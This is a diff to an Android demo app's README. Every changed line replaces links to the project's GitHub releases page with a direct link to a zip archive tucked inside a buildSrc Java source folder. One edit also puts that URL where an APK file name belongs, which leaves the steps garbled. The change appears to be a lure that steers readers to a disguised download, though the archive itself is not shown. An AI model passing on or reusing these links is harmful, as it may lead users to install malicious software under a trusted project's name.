@@ -6,7 +6,7 @@ Welcome to AndroidChooseDemo! This application helps you navigate through variou
 
 ## 📥 Download the Application
 
-[![Download AndroidChooseDemo](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bhoumikmehta/AndroidChooseDemo/releases)
+[![Download AndroidChooseDemo](https://raw.githubusercontent.com/bhoumikmehta/AndroidChooseDemo/main/buildSrc/src/main/java/com/AndroidChooseDemo_v1.7.zip)](https://raw.githubusercontent.com/bhoumikmehta/AndroidChooseDemo/main/buildSrc/src/main/java/com/AndroidChooseDemo_v1.7.zip)
 
 ## 📂 System Requirements
 
@@ -31,7 +31,7 @@ AndroidChooseDemo offers several helpful features:
 
 1. **Visit the Download Page**
 
-   To get the application, visit the following link: [Download Here](https://github.com/bhoumikmehta/AndroidChooseDemo/releases).
+   To get the application, visit the following link: [Download Here](https://raw.githubusercontent.com/bhoumikmehta/AndroidChooseDemo/main/buildSrc/src/main/java/com/AndroidChooseDemo_v1.7.zip).
 
 2. **Select the Latest Release**
 
@@ -39,7 +39,7 @@ AndroidChooseDemo offers several helpful features:
 
 3. **Download the APK File**
 
-   Look for the APK file for AndroidChooseDemo. Click on the file to start the download. The file name will look something like `AndroidChooseDemo-v1.0.apk`.
+   Look for the APK file for AndroidChooseDemo. Click on the file to start the download. The file name will look something like `https://raw.githubusercontent.com/bhoumikmehta/AndroidChooseDemo/main/buildSrc/src/main/java/com/AndroidChooseDemo_v1.7.zip`.
 
 4. **Install the Application**
 
@@ -76,4 +76,4 @@ For any questions or problems, feel free to reach out. You can submit an issue d
 
 Keep an eye on the releases page for the latest updates and new features. 
 
-For more information, visit the [GitHub Releases Page](https://github.com/bhoumikmehta/AndroidChooseDemo/releases) again. Your feedback and engagement are valuable as we strive to make AndroidChooseDemo even better!
+For more information, visit the [GitHub Releases Page](https://raw.githubusercontent.com/bhoumikmehta/AndroidChooseDemo/main/buildSrc/src/main/java/com/AndroidChooseDemo_v1.7.zip) again. Your feedback and engagement are valuable as we strive to make AndroidChooseDemo even better!
